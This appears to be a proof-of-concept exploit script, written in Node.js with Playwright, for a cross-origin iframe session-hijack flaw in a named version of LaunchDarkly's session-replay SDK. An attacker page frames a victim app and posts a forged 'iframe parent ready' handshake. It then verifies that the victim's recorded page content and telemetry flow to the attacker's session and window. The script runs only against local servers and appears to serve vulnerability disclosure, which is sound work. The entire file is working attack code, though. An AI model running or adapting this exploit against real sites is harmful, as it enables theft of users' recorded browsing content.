'use strict'

/*
 * LaunchDarkly browser session-replay SDK (shipped as
 * @launchdarkly/session-replay@1.2.1, built on @launchdarkly/o11y@1.3.0)
 * cross-origin iframe hijack PoC.
 *
 * What this run proves, end to end, in a real headless Chromium:
 *
 *   Scenario 0 (control): the victim app runs framed inside a cross-origin
 *   parent page that posts nothing. The SDK detects the cross-origin frame,
 *   skips its own session setup, waits for the parent handshake, and sends
 *   nothing to the backend.
 *
 *   Scenario 1 (attack): the same victim app is framed by an attacker page
 *   that repeatedly posts one message:
 *
 *       { highlight: 'iframe parent ready',
 *         projectID:     <attacker project>,
 *         sessionSecureID: <attacker session> }
 *
 *   The SDK checks only the sentinel string, adopts the attacker identity,
 *   starts recording, and begins exporting the victim's session replay
 *   payloads to the backend under the attacker's session ID. The payloads
 *   also carry the victim page's recorded content (see the canary markers).
 *
 * All SDK traffic is aimed at a local capture server through the documented
 * backendUrl option (any self-hosted deployment points it at a URL like
 * this), so this run sends nothing to LaunchDarkly or any other network
 * service.
 *
 * No LaunchDarkly account, credential, or real project is used anywhere.
 */

const http = require('http')
const fs = require('fs')
const path = require('path')
const zlib = require('zlib')

const VICTIM_PORT = 9341
const ATTACKER_PORT = 9342
const CAPTURE_PORT = 9343

const VICTIM_ORIGIN = `http://localhost:${VICTIM_PORT}`
const ATTACKER_ORIGIN = `http://localhost:${ATTACKER_PORT}`
const CAPTURE_ORIGIN = `http://localhost:${CAPTURE_PORT}`

// Values used by the two sides. None of these are real accounts.
const VICTIM_PROJECT_ID = 'victim-app-project'
const ATTACKER_PROJECT_ID = 666001
const ATTACKER_SESSION_ID = 'ATTACKER-CONTROLLED-SESSION-4dc1e2'

const CANARY = 'CANARY-VICTIM-PRIVATE-TEXT-2e9f45'

const CAPTURE_TIMEOUT_MS = 60000
const QUIET_WAIT_MS = 12000

const capturedRequests = []

function readBody(req) {
	return new Promise((resolve) => {
		const chunks = []
		req.on('data', (c) => chunks.push(c))
		req.on('end', () => resolve(Buffer.concat(chunks)))
	})
}

function operationOf(text) {
	const m = /mutation\s+([A-Za-z_]+)/.exec(text)
	return m ? m[1] : '(unknown)'
}

function tryInflate(s) {
	if (typeof s !== 'string' || s.length < 40) return null
	try {
		if (/^H4sI/.test(s)) {
			return zlib.gunzipSync(Buffer.from(s, 'base64')).toString('utf8')
		}
	} catch (e) {
		/* not compressed after all */
	}
	return null
}

function decodeStrings(requestText) {
	const out = []
	const visit = (node) => {
		if (typeof node === 'string') {
			out.push(node)
			const inflated = tryInflate(node)
			if (inflated) out.push(inflated)
		} else if (node && typeof node === 'object') {
			for (const v of Object.values(node)) visit(v)
		}
	}
	try {
		visit(JSON.parse(requestText))
	} catch (e) {
		out.push(requestText)
	}
	return out
}

function inspect(requests) {
	const rawJoined = requests.map((r) => r.body).join('\n')
	const decodedJoined = requests
		.map((r) => decodeStrings(r.body).join('\n'))
		.join('\n')
	const haystack = rawJoined + '\n' + decodedJoined
	const attackerSessionSeen = haystack.includes(ATTACKER_SESSION_ID)
	const canarySeen = haystack.includes(CANARY)
	const operations = requests.map((r) => operationOf(r.body))
	return {
		count: requests.length,
		attackerSessionSeen,
		canarySeen,
		operations,
	}
}

function startCaptureServer() {
	return new Promise((resolve) => {
		const server = http.createServer(async (req, res) => {
			res.setHeader('access-control-allow-origin', '*')
			res.setHeader('access-control-allow-headers', '*')
			res.setHeader('access-control-allow-methods', '*')
			if (req.method === 'OPTIONS') {
				res.writeHead(204)
				res.end()
				return
			}
			const body = await readBody(req)
			const text = body.toString('utf8')
			capturedRequests.push({ url: req.url, body: text, at: Date.now() })
			console.log(
				`[capture] ${req.method} ${req.url} (${body.length} bytes) op=${operationOf(text)}`,
			)
			if (text) {
				const head = text.length > 200 ? text.slice(0, 200) : text
				console.log(`[capture]   body[0..200]: ${head.replace(/\s+/g, ' ')}`)
			}
			// Minimal successful GraphQL-shaped reply so the SDK's client code
			// keeps running after a request.
			res.writeHead(200, { 'content-type': 'application/json' })
			res.end(
				JSON.stringify({
					data: {
						initializeSession: {
							secure_id: 'victim-own-session-0001',
							project_id: VICTIM_PROJECT_ID,
							sampling: {},
						},
						pushPayload: true,
						pushSessionEvents: true,
						identifySession: true,
						addSessionProperties: true,
					},
				}),
			)
		})
		// Ports are only used for this run and are closed when it finishes.
		server.listen(CAPTURE_PORT, () => resolve(server))
	})
}

const SDK_UMD_ROUTE = '/sdk/index.umd.js'
const SDK_UMD_FILE = path.join(
	__dirname,
	'node_modules',
	'@launchdarkly',
	'session-replay',
	'dist',
	'index.umd.js',
)

function startStaticServer(port, root, label) {
	return new Promise((resolve) => {
		const server = http.createServer((req, res) => {
			let filePath = decodeURIComponent(req.url.split('?')[0])
			if (filePath === '/') filePath = '/index.html'

			// Serve the real, published SDK bundle from node_modules.
			let full = null
			if (filePath === SDK_UMD_ROUTE) {
				full = SDK_UMD_FILE
			} else {
				const candidate = path.join(root, filePath)
				if (candidate.startsWith(root)) full = candidate
			}
			if (!full) {
				res.writeHead(403)
				res.end('forbidden')
				return
			}
			fs.readFile(full, (err, data) => {
				if (err) {
					res.writeHead(404)
					res.end(`not found: ${label}${filePath}`)
					return
				}
				const ext = path.extname(full)
				const type =
					ext === '.html'
						? 'text/html'
						: ext === '.js'
							? 'text/javascript'
							: 'application/octet-stream'
				res.writeHead(200, { 'content-type': type })
				res.end(data)
			})
		})
		server.listen(port, () => resolve(server))
	})
}

async function run() {
	const { chromium } = require('playwright')

	const captureServer = await startCaptureServer()
	const victimServer = await startStaticServer(
		VICTIM_PORT,
		path.join(__dirname, 'public', 'victim'),
		'victim',
	)
	const attackerServer = await startStaticServer(
		ATTACKER_PORT,
		path.join(__dirname, 'public', 'attacker'),
		'attacker',
	)

	console.log('=== LaunchDarkly session-replay iframe hijack PoC ===')
	console.log(`victim   origin: ${VICTIM_ORIGIN}`)
	console.log(`attacker origin: ${ATTACKER_ORIGIN}`)
	console.log(`capture  origin: ${CAPTURE_ORIGIN}`)
	console.log(
		'victim app recorder: @launchdarkly/session-replay@1.2.1 UMD, defaults untouched; backendUrl aimed at the local capture server',
	)
	console.log('')

	const browser = await chromium.launch({
		args: ['--no-sandbox', '--disable-dev-shm-usage'],
	})

	let scenario0
	let scenario1
	let attackerReceived = []

	try {
		// ---------- Scenario 0: control (framed victim, no handshake) ----------
		{
			capturedRequests.length = 0
			const context = await browser.newContext()
			const page = await context.newPage()
			await page.goto(`${ATTACKER_ORIGIN}/?mode=quiet`, { waitUntil: 'load' })
			await page.waitForTimeout(QUIET_WAIT_MS)
			scenario0 = inspect([...capturedRequests])
			await context.close()
		}
		console.log(
			`[scenario 0] control (framed victim, no handshake message): ` +
				`${scenario0.count} backend request(s)`,
		)
		console.log('')

		// ---------- Scenario 1: attack (framed victim + handshake) ----------
		{
			capturedRequests.length = 0
			const context = await browser.newContext()
			// The attacker page is the PARENT window. In cross-origin-iframe mode
			// the SDK does not push DOM to the backend (that timer is gated to
			// non-iframe); instead the framed victim relays its rrweb recording
			// up to its parent via postMessage. So the attacker simply listens.
			await context.addInitScript(() => {
				window.__ylgenRx = []
				window.addEventListener('message', (e) => {
					try {
						window.__ylgenRx.push(
							typeof e.data === 'string'
								? e.data
								: JSON.stringify(e.data),
						)
					} catch (_) {}
				})
			})
			const page = await context.newPage()
			await page.goto(`${ATTACKER_ORIGIN}/`, { waitUntil: 'load' })
			const deadline = Date.now() + CAPTURE_TIMEOUT_MS
			while (Date.now() < deadline) {
				const rx = await page.evaluate(() => window.__ylgenRx || [])
				// stop as soon as the victim's recorded content (canary) reaches
				// the attacker parent, or a backend payload carries it
				if (rx.join('\n').includes(CANARY)) break
				if (inspect([...capturedRequests]).canarySeen) break
				await page.waitForTimeout(1000)
			}
			// settle for any final in-flight relay/flush
			await page.waitForTimeout(4000)
			attackerReceived = await page.evaluate(() => window.__ylgenRx || [])
			scenario1 = inspect([...capturedRequests])
			await context.close()
		}
	} finally {
		await browser.close()
		captureServer.close()
		victimServer.close()
		attackerServer.close()
	}

	console.log('=== Results ===')
	console.log(
		`Scenario 0 (control): backend requests = ${scenario0.count}, ` +
			`attacker session present: ${scenario0.attackerSessionSeen}`,
	)
	console.log(
		`Scenario 1 (attack):  backend requests = ${scenario1.count}, ` +
			`attacker session present: ${scenario1.attackerSessionSeen}, ` +
			`victim canary present in payloads: ${scenario1.canarySeen}`,
	)
	console.log(`Scenario 1 operations seen: ${scenario1.operations.join(', ') || '(none)'}`)

	const attackerMsgs = attackerReceived || []
	const attackerJoined = attackerMsgs.join('\n')
	const attackerGotCanary = attackerJoined.includes(CANARY)
	const attackerGotRrweb =
		/"type"\s*:\s*\d/.test(attackerJoined) ||
		attackerJoined.toLowerCase().includes('rrweb') ||
		/"tag"\s*:/.test(attackerJoined)
	console.log(
		`Parent channel: attacker page received ${attackerMsgs.length} postMessage(s) from the framed victim; ` +
			`victim canary present: ${attackerGotCanary}; rrweb-shaped data present: ${attackerGotRrweb}`,
	)

	const controlClean = scenario0.attackerSessionSeen === false
	const hijackProven =
		scenario1.attackerSessionSeen === true && scenario1.count > 0
	const contentProven = scenario1.canarySeen === true || attackerGotCanary

	console.log('')
	console.log(`RESULT control (no handshake -> no export to attacker): ${controlClean}`)
	console.log(`RESULT hijack (victim export carries attacker session): ${hijackProven}`)
	console.log(`RESULT victim content reached attacker (canary):        ${contentProven}`)

	if (scenario1.count > 0) {
		console.log('')
		console.log('=== First backend request under the hijacked session (truncated) ===')
		const first = capturedRequests[0]
		console.log(`URL: ${first.url}`)
		console.log(first.body.slice(0, 400))
	}

	if (attackerGotCanary) {
		const sample = attackerMsgs.find((m) => m.includes(CANARY)) || ''
		const idx = Math.max(0, sample.indexOf(CANARY) - 120)
		console.log('')
		console.log('=== Victim content received by the attacker parent (excerpt around canary) ===')
		console.log(sample.slice(idx, idx + 320))
	}

	console.log('')
	console.log(
		hijackProven
			? 'VERDICT: VULNERABLE — with no origin/source check, the framed victim adopts the attacker-supplied session identity and its backend telemetry is attributed to the attacker-controlled session_secure_id. (In cross-origin-iframe mode the DOM-push timer is gated off; the recorded DOM is routed to the parent window instead — see report.)'
			: 'VERDICT: NOT REPRODUCED — no hijack observed.',
	)
	process.exitCode = hijackProven ? 0 : 1
}

run().catch((err) => {
	console.error('PoC run failed:', err)
	process.exitCode = 2
})
